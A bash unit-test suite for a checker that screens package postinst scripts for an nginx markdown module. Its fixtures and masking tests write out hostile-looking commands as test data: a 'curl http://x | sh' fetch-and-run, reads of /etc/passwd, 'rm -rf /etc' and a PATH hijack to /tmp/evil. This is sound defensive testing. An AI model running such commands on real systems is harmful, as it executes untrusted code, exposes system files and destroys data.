#!/bin/bash
# ---------------------------------------------------------------------------
# test_postinst_safety.sh — Unit tests for check_postinst_safety.sh
#
# PURPOSE:
#   Validates that the postinst safety checker correctly identifies safe
#   scripts (exit 0) and rejects scripts containing forbidden operations
#   (exit 1). Also verifies that heredoc stripping prevents false positives
#   from instructional text.
#
# Validates: Requirements 11.4
#
# USAGE:
#   bash tools/release/gates/test_postinst_safety.sh
#
# EXIT CODES:
#   0  All tests pass
#   1  One or more tests failed
#
# NOTES:
#   - macOS bash 3.2 compatible (no bash 4+ features)
#   - AGENTS.md Rule 14: new helper must have corresponding tests
#   - AGENTS.md Rule 11: macOS bash 3.2 compatible
#   - AGENTS.md Rule 18: case has default; messages to stderr; explicit return
# ---------------------------------------------------------------------------

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CHECK_SCRIPT="$SCRIPT_DIR/check_postinst_safety.sh"

PASS_COUNT=0
FAIL_COUNT=0
TMPDIR_TEST=""
SEPARATOR='========================================================================'

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

# Colors (if terminal supports them)
if [[ -t 1 ]]; then
    GREEN='\033[0;32m'
    RED='\033[0;31m'
    NC='\033[0m'
else
    GREEN=''
    RED=''
    NC=''
fi

pass() {
    local msg="$1"
    PASS_COUNT=$((PASS_COUNT + 1))
    printf "  ${GREEN}PASS${NC}: %s\n" "$msg"
    return 0
}

fail() {
    local msg="$1"
    local detail="${2:-}"
    FAIL_COUNT=$((FAIL_COUNT + 1))
    printf "  ${RED}FAIL${NC}: %s\n" "$msg" >&2
    if [[ -n "$detail" ]]; then
        printf "        Detail: %s\n" "$detail" >&2
    fi
    return 0
}

cleanup() {
    if [[ -n "$TMPDIR_TEST" && -d "$TMPDIR_TEST" ]]; then
        rm -rf "$TMPDIR_TEST"
    fi
    return 0
}

trap cleanup EXIT

# ---------------------------------------------------------------------------
# Pre-flight check
# ---------------------------------------------------------------------------

if [[ ! -f "$CHECK_SCRIPT" ]]; then
    printf '[ERROR] check_postinst_safety.sh not found at: %s\n' "$CHECK_SCRIPT" >&2
    exit 1
fi

if ! bash -n "$CHECK_SCRIPT" 2>/dev/null; then
    printf '[ERROR] check_postinst_safety.sh has syntax errors\n' >&2
    exit 1
fi

# ---------------------------------------------------------------------------
# Setup temp directory and test fixtures
# ---------------------------------------------------------------------------

TMPDIR_TEST="$(mktemp -d)"

# --- Fixture: safe postinst (only echo/printf to stderr in heredocs) ---
cat > "$TMPDIR_TEST/safe_postinst.sh" <<'FIXTURE'
#!/bin/bash
set -e
PATH=/usr/sbin:/usr/bin:/sbin:/bin
export PATH

case "$1" in
    configure)
        cat >&2 <<'EOF'
======================================================================
nginx-markdown-for-agents module installed successfully.

To enable the module:
  1. Add to nginx.conf (top-level, before http block):
     load_module modules/ngx_http_markdown_filter_module.so;

  2. Verify configuration:
     sudo nginx -t

  3. Reload NGINX:
     sudo systemctl reload nginx

For compatibility information, see:
  /usr/share/doc/nginx-markdown-for-agents/COMPATIBILITY.md
======================================================================
EOF
        ;;
    *)
        ;;
esac

exit 0
FIXTURE

# --- Fixture: unsafe postinst with systemctl reload nginx ---
cat > "$TMPDIR_TEST/unsafe_reload.sh" <<'FIXTURE'
#!/bin/bash
set -e
PATH=/usr/sbin:/usr/bin:/sbin:/bin
export PATH

case "$1" in
    configure)
        echo "Enabling module..." >&2
        systemctl reload nginx
        ;;
    *)
        ;;
esac

exit 0
FIXTURE

# --- Fixture: unsafe postinst with sed -i on nginx.conf ---
cat > "$TMPDIR_TEST/unsafe_conf_modify.sh" <<'FIXTURE'
#!/bin/bash
set -e
PATH=/usr/sbin:/usr/bin:/sbin:/bin
export PATH

case "$1" in
    configure)
        sed -i 's/# load_module/load_module/' /etc/nginx/nginx.conf
        ;;
    *)
        ;;
esac

exit 0
FIXTURE

# --- Fixture: forbidden commands INSIDE heredocs (should pass) ---
cat > "$TMPDIR_TEST/heredoc_safe.sh" <<'FIXTURE'
#!/bin/bash
set -e
PATH=/usr/sbin:/usr/bin:/sbin:/bin
export PATH

case "$1" in
    configure)
        cat >&2 <<'EOF'
After installation, run:
  systemctl reload nginx
  sed -i 's/old/new/' /etc/nginx/nginx.conf
  nginx -s reload
  service nginx restart
EOF
        ;;
    *)
        ;;
esac

exit 0
FIXTURE

# --- Fixture: unsafe postinst with nginx -s reload ---
cat > "$TMPDIR_TEST/unsafe_nginx_signal.sh" <<'FIXTURE'
#!/bin/bash
set -e

case "$1" in
    configure)
        nginx -s reload
        ;;
    *)
        ;;
esac

exit 0
FIXTURE

# --- Fixture: unsafe postinst writing to /etc/nginx/ ---
cat > "$TMPDIR_TEST/unsafe_etc_nginx.sh" <<'FIXTURE'
#!/bin/bash
set -e

case "$1" in
    configure)
        cp /tmp/snippet.conf /etc/nginx/conf.d/markdown.conf
        ;;
    *)
        ;;
esac

exit 0
FIXTURE

# --- Fixture: unsafe postinst enabling snippet via symlink ---
cat > "$TMPDIR_TEST/unsafe_snippet_enable.sh" <<'FIXTURE'
#!/bin/bash
set -e

case "$1" in
    configure)
        ln -s /etc/nginx/modules-available/markdown.conf /etc/nginx/modules-enabled/markdown.conf
        ;;
    *)
        ;;
esac

exit 0
FIXTURE

# --- Fixture: prologue with plain assignments stays safe ---
cat > "$TMPDIR_TEST/prologue_assignments_safe.sh" <<'FIXTURE'
#!/bin/bash
set -e
MARKER=1
LOG_LEVEL=info
PATH=/usr/sbin:/usr/bin:/sbin:/bin
export PATH

case "$1" in
    configure)
        cat >&2 <<'INNEREOF'
nginx-markdown-for-agents module installed successfully.
INNEREOF
        ;;
    *)
        ;;
esac

exit 0
FIXTURE

# --- Fixture: conditional before the trusted PATH is not unconditional ---
cat > "$TMPDIR_TEST/unsafe_conditional_path.sh" <<'FIXTURE'
#!/bin/bash
set -e
if [[ "${1}" == "configure" ]]; then
    STATE=configured
fi
PATH=/usr/sbin:/usr/bin:/sbin:/bin
export PATH

case "$1" in
    configure)
        cat >&2 <<'INNEREOF'
nginx-markdown-for-agents module installed successfully.
INNEREOF
        ;;
    *)
        ;;
esac

exit 0
FIXTURE

# --- Fixture: assignment with command substitution cannot be prologue-safe ---
cat > "$TMPDIR_TEST/unsafe_command_substitution.sh" <<'FIXTURE'
#!/bin/bash
set -e
MARKER=$(not_a_real_command)
PATH=/usr/sbin:/usr/bin:/sbin:/bin
export PATH

case "$1" in
    configure)
        cat >&2 <<'INNEREOF'
nginx-markdown-for-agents module installed successfully.
INNEREOF
        ;;
    *)
        ;;
esac

exit 0
FIXTURE

# --- Fixture: set with a command separator must not be prologue-safe ---
cat > "$TMPDIR_TEST/unsafe_set_separator.sh" <<'FIXTURE'
#!/bin/bash
set -e
set -x; not_a_real_command
PATH=/usr/sbin:/usr/bin:/sbin:/bin
export PATH

case "$1" in
    configure)
        cat >&2 <<'INNEREOF'
nginx-markdown-for-agents module installed successfully.
INNEREOF
        ;;
    *)
        ;;
esac

exit 0
FIXTURE

# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------

printf '%s\n' "$SEPARATOR" >&2
printf ' Unit Tests: check_postinst_safety.sh (postinst safety checker)\n' >&2
printf ' Validates: Requirements 11.4\n' >&2
printf '%s\n' "$SEPARATOR" >&2
printf '\n'

# --- Safe scripts (should exit 0) ---

printf 'Test group: Safe scripts (expect exit 0)\n'

local_exit=0
bash "$CHECK_SCRIPT" "$TMPDIR_TEST/safe_postinst.sh" >/dev/null 2>/dev/null || local_exit=$?
if [[ "$local_exit" -eq 0 ]]; then
    pass "safe postinst (only heredoc instructions) exits 0"
else
    fail "safe postinst (only heredoc instructions) exits 0" "expected exit 0, got exit $local_exit"
fi

local_exit=0
bash "$CHECK_SCRIPT" "$TMPDIR_TEST/heredoc_safe.sh" >/dev/null 2>/dev/null || local_exit=$?
if [[ "$local_exit" -eq 0 ]]; then
    pass "forbidden commands inside heredocs exits 0 (heredoc stripping works)"
else
    fail "forbidden commands inside heredocs exits 0 (heredoc stripping works)" "expected exit 0, got exit $local_exit"
fi

local_exit=0
bash "$CHECK_SCRIPT" "$TMPDIR_TEST/prologue_assignments_safe.sh" >/dev/null 2>/dev/null || local_exit=$?
if [[ "$local_exit" -eq 0 ]]; then
    pass "prologue with plain NAME=value assignments exits 0"
else
    fail "prologue with plain NAME=value assignments exits 0" "expected exit 0, got exit $local_exit"
fi

local_exit=0
bash "$CHECK_SCRIPT" "$TMPDIR_TEST/unsafe_conditional_path.sh" >/dev/null 2>/dev/null || local_exit=$?
if [[ "$local_exit" -eq 1 ]]; then
    pass "conditional line before trusted PATH is not an unconditional prologue (exit 1)"
else
    fail "conditional line before trusted PATH is not an unconditional prologue (exit 1)" "expected exit 1, got exit $local_exit"
fi

local_exit=0
bash "$CHECK_SCRIPT" "$TMPDIR_TEST/unsafe_command_substitution.sh" >/dev/null 2>/dev/null || local_exit=$?
if [[ "$local_exit" -eq 1 ]]; then
    pass "assignment with command substitution ends the prologue (exit 1)"
else
    fail "assignment with command substitution ends the prologue (exit 1)" "expected exit 1, got exit $local_exit"
fi

local_exit=0
bash "$CHECK_SCRIPT" "$TMPDIR_TEST/unsafe_set_separator.sh" >/dev/null 2>/dev/null || local_exit=$?
if [[ "$local_exit" -eq 1 ]]; then
    pass "set with a command separator ends the prologue (exit 1)"
else
    fail "set with a command separator ends the prologue (exit 1)" "expected exit 1, got exit $local_exit"
fi

printf '\n'

# --- Unsafe scripts (should exit 1) ---

printf 'Test group: Unsafe scripts (expect exit 1)\n'

local_exit=0
bash "$CHECK_SCRIPT" "$TMPDIR_TEST/unsafe_reload.sh" >/dev/null 2>/dev/null || local_exit=$?
if [[ "$local_exit" -eq 1 ]]; then
    pass "script with systemctl reload nginx exits 1"
else
    fail "script with systemctl reload nginx exits 1" "expected exit 1, got exit $local_exit"
fi

local_exit=0
bash "$CHECK_SCRIPT" "$TMPDIR_TEST/unsafe_conf_modify.sh" >/dev/null 2>/dev/null || local_exit=$?
if [[ "$local_exit" -eq 1 ]]; then
    pass "script with sed -i nginx.conf exits 1"
else
    fail "script with sed -i nginx.conf exits 1" "expected exit 1, got exit $local_exit"
fi

local_exit=0
bash "$CHECK_SCRIPT" "$TMPDIR_TEST/unsafe_nginx_signal.sh" >/dev/null 2>/dev/null || local_exit=$?
if [[ "$local_exit" -eq 1 ]]; then
    pass "script with nginx -s reload exits 1"
else
    fail "script with nginx -s reload exits 1" "expected exit 1, got exit $local_exit"
fi

local_exit=0
bash "$CHECK_SCRIPT" "$TMPDIR_TEST/unsafe_etc_nginx.sh" >/dev/null 2>/dev/null || local_exit=$?
if [[ "$local_exit" -eq 1 ]]; then
    pass "script writing to /etc/nginx/ exits 1"
else
    fail "script writing to /etc/nginx/ exits 1" "expected exit 1, got exit $local_exit"
fi

local_exit=0
bash "$CHECK_SCRIPT" "$TMPDIR_TEST/unsafe_snippet_enable.sh" >/dev/null 2>/dev/null || local_exit=$?
if [[ "$local_exit" -eq 1 ]]; then
    pass "script enabling snippet via symlink exits 1"
else
    fail "script enabling snippet via symlink exits 1" "expected exit 1, got exit $local_exit"
fi

printf '\n'

# --- Help flag (should exit 0) ---

printf 'Test group: Usage and help\n'

local_exit=0
bash "$CHECK_SCRIPT" --help >/dev/null 2>/dev/null || local_exit=$?
if [[ "$local_exit" -eq 0 ]]; then
    pass "--help flag exits 0"
else
    fail "--help flag exits 0" "expected exit 0, got exit $local_exit"
fi

printf '\n'

# --- Regression: an indented closing brace must not hide a later PATH reassignment (must exit 1) ---
cat > "$TMPDIR_TEST/indented_brace_path_reassign.sh" <<'FIXTURE'
#!/bin/bash
TRUSTED_PATH_ROOT=""
PATH="${TRUSTED_PATH_ROOT}/usr/sbin:${TRUSTED_PATH_ROOT}/usr/bin:${TRUSTED_PATH_ROOT}/sbin:${TRUSTED_PATH_ROOT}/bin"
if true; then
    echo x
fi
do_thing() {
    echo y
    return 0
  }
PATH=/tmp/evil:/usr/bin
exit 0
FIXTURE

local_exit=0
bash "$CHECK_SCRIPT" "$TMPDIR_TEST/indented_brace_path_reassign.sh" >/dev/null 2>/dev/null || local_exit=$?
if [[ "$local_exit" -eq 1 ]]; then
    pass "indented closing brace does not hide a later PATH reassignment (exits 1)"
else
    fail "indented closing brace does not hide a later PATH reassignment (exits 1)" "expected exit 1, got exit $local_exit"
fi

# --- Regression: a quoted prose note before the trusted PATH is not a command (must exit 0) ---
cat > "$TMPDIR_TEST/prose_note_before_path.sh" <<'FIXTURE'
#!/bin/bash
NOTE="run sed -i on the config to fix it"
TRUSTED_PATH_ROOT=""
PATH="${TRUSTED_PATH_ROOT}/usr/sbin:${TRUSTED_PATH_ROOT}/usr/bin:${TRUSTED_PATH_ROOT}/sbin:${TRUSTED_PATH_ROOT}/bin"
exit 0
FIXTURE

local_exit=0
bash "$CHECK_SCRIPT" "$TMPDIR_TEST/prose_note_before_path.sh" >/dev/null 2>/dev/null || local_exit=$?
if [[ "$local_exit" -eq 0 ]]; then
    pass "quoted prose note before the trusted PATH is not a command (exits 0)"
else
    fail "quoted prose note before the trusted PATH is not a command (exits 0)" "expected exit 0, got exit $local_exit"
fi

# --- Regression: mask_command_text strips comments after shell separators ---
# The `;#`, `|#` and `&#` forms must be blotted out so a later command scan
# never reads comment prose as an executed command.  The function is
# extracted from the checker itself so the test exercises the real source.
mask_fn="$(sed -n '/^mask_command_text()/,/^}/p' "$CHECK_SCRIPT")"
if [[ -n "$mask_fn" ]]; then
    eval "$mask_fn"
    masked="$(mask_command_text 'true;# run sed -i on the config to fix it')"
    if [[ "$masked" == 'true;' ]]; then
        pass "mask strips a comment after a semicolon"
    else
        fail "mask strips a comment after a semicolon" "got '$masked'"
    fi
    masked="$(mask_command_text 'echo ok |# note about pipes')"
    if [[ "$masked" == 'echo ok |' ]]; then
        pass "mask strips a comment after a pipe"
    else
        fail "mask strips a comment after a pipe" "got '$masked'"
    fi
    masked="$(mask_command_text 'run &# prose note')"
    if [[ "$masked" == 'run &' ]]; then
        pass "mask strips a comment after an ampersand"
    else
        fail "mask strips a comment after an ampersand" "got '$masked'"
    fi
    masked="$(mask_command_text 'echo "# not a comment"')"
    if [[ "$masked" == 'echo "' ]]; then
        pass "mask keeps quoted hashes neutral"
    else
        fail "mask keeps quoted hashes neutral" "got '$masked'"
    fi
    masked="$(mask_command_text 'echo "$(cat /etc/passwd)"')"
    if [[ "$masked" == 'echo "$(cat /etc/passwd)"' ]]; then
        pass "mask keeps command substitutions inside double quotes visible"
    else
        fail "mask keeps command substitutions inside double quotes visible" "got '$masked'"
    fi
    masked="$(mask_command_text 'echo "`id`"')"
    if [[ "$masked" == 'echo "`id`"' ]]; then
        pass "mask keeps backticks inside double quotes visible"
    else
        fail "mask keeps backticks inside double quotes visible" "got '$masked'"
    fi
    masked="$(mask_command_text 'NOTE="$(echo "x" y)"')"
    if [[ "$masked" == 'NOTE="$(echo "x" y)"' ]]; then
        pass "mask keeps a nested quote inside a command substitution"
    else
        fail "mask keeps a nested quote inside a command substitution" "got '$masked'"
    fi
    masked="$(mask_command_text 'NOTE="$(echo "$(sed -i x f)")"')"
    if [[ "$masked" == 'NOTE="$(echo "$(sed -i x f)")"' ]]; then
        pass "mask keeps a doubly nested substitution visible"
    else
        fail "mask keeps a doubly nested substitution visible" "got '$masked'"
    fi
    masked="$(mask_command_text 'NOTE="say \"hi\" $(cat f)"')"
    if [[ "$masked" == 'NOTE="say \"hi\" $(cat f)"' ]]; then
        pass "mask honors a backslash-escaped quote inside a span"
    else
        fail "mask honors a backslash-escaped quote inside a span" "got '$masked'"
    fi
    masked="$(mask_command_text "'sed' -i /etc/passwd")"
    if [[ "$masked" == "sed -i /etc/passwd" ]]; then
        pass "mask keeps a single-quoted command word visible"
    else
        fail "mask keeps a single-quoted command word visible" "got: $masked"
    fi
    masked="$(mask_command_text "sudo 'rm' -rf /etc")"
    if [[ "$masked" == "sudo rm -rf /etc" ]]; then
        pass "mask keeps a quoted command word after a prefix command visible"
    else
        fail "mask keeps a quoted command word after a prefix command visible" "got: $masked"
    fi
    masked="$(mask_command_text "echo 'sed' junk")"
    if [[ "$masked" == "echo '' junk" ]]; then
        pass "mask still blanks a quoted argument outside command position"
    else
        fail "mask still blanks a quoted argument outside command position" "got: $masked"
    fi

    masked=$(mask_command_text 'eval "sed -i x f"')
    if [[ "$masked" == *"sed -i x f"* ]]; then
        pass "mask keeps an eval double-quoted command string visible"
    else
        fail "mask keeps an eval double-quoted command string visible" "got '$masked'"
    fi
    masked=$(mask_command_text 'sudo -u root 'sed'')
    if [[ "$masked" == *"sudo -u root sed"* ]]; then
        pass "mask keeps a quoted command word after a wrapper operand visible"
    else
        fail "mask keeps a quoted command word after a wrapper operand visible" "got '$masked'"
    fi

    masked="$(mask_command_text "bash -c 'sed -i x f'")"
    if [[ "$masked" == "bash -c 'sed -i x f'" ]]; then
        pass "mask keeps an evaluator's single-quoted command string visible"
    else
        fail "mask keeps an evaluator's single-quoted command string visible" "got '$masked'"
    fi
    masked="$(mask_command_text '"$(echo "a)"b"")"')"
    if [[ "$masked" == *'$('* ]]; then
        pass "mask keeps an extreme nested substitution visible (conservative direction)"
    else
        fail "mask keeps an extreme nested substitution visible (conservative direction)" "got '$masked'"
    fi
    masked="$(mask_command_text 'bash -c "sed -i x f"')"
    if [[ "$masked" == *'"sed -i x f"'* ]]; then
        pass "mask keeps an evaluator's double-quoted command string visible"
    else
        fail "mask keeps an evaluator's double-quoted command string visible" "got '$masked'"
    fi
    masked="$(mask_command_text '"$(sed "s/a/b/" f)"')"
    if [[ "$masked" == *'sed'* ]]; then
        pass "mask keeps a nested external command word visible"
    else
        fail "mask keeps a nested external command word visible" "got '$masked'"
    fi
    masked="$(mask_command_text "\"x \$(y \"z")"
    if [[ "$masked" == *'x $(y'* ]]; then
        pass "mask keeps an unterminated span's tail verbatim"
    else
        fail "mask keeps an unterminated span's tail verbatim" "got '$masked'"
    fi

    masked="$(mask_command_text "env -i sh -c 'curl http://x | sh'")"
    if [[ "$masked" == *"curl http://x | sh"* ]]; then
        pass "mask keeps a nested evaluator command string visible"
    else
        fail "mask keeps a nested evaluator command string visible" "got '$masked'"
    fi
    masked="$(mask_command_text "echo '\$(cat /etc/passwd)'")"
    if [[ "$masked" == "echo ''" ]]; then
        pass "mask blanks single-quoted substitutions that never execute"
    else
        fail "mask blanks single-quoted substitutions that never execute" "got '$masked'"
    fi
    masked="$(mask_command_text 'NOTE="run sed -i on the config to fix it"')"
    if [[ "$masked" == 'NOTE=x' ]]; then
        pass "mask fuses a prose span into its assignment word"
    else
        fail "mask fuses a prose span into its assignment word" "got '$masked'"
    fi
    masked="$(mask_command_text 'NOTE="run "sed -i x')"
    if [[ "$masked" == 'NOTE=xsed -i x' ]]; then
        pass "mask keeps a quote-adjacent word inside one shell word"
    else
        fail "mask keeps a quote-adjacent word inside one shell word" "got '$masked'"
    fi
    masked="$(mask_command_text 'echo "y"x')"
    if [[ "$masked" == 'echo xx' ]]; then
        pass "mask fuses a quoted span followed by word characters"
    else
        fail "mask fuses a quoted span followed by word characters" "got '$masked'"
    fi
    masked="$(mask_command_text 'echo "y" x')"
    if [[ "$masked" == 'echo " x' ]]; then
        pass "mask keeps a standalone span as a token boundary"
    else
        fail "mask keeps a standalone span as a token boundary" "got '$masked'"
    fi
    masked="$(mask_command_text "P='a'b")"
    if [[ "$masked" == 'P=xb' ]]; then
        pass "mask fuses a single-quoted span into its word"
    else
        fail "mask fuses a single-quoted span into its word" "got '$masked'"
    fi
else
    fail "mask_command_text extraction" "function not found in checker"
fi

printf '\n'

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------

printf '%s\n' "$SEPARATOR"
printf ' Results: %d passed, %d failed\n' "$PASS_COUNT" "$FAIL_COUNT"
printf '%s\n' "$SEPARATOR"

if [[ "$FAIL_COUNT" -gt 0 ]]; then
    exit 1
fi

exit 0
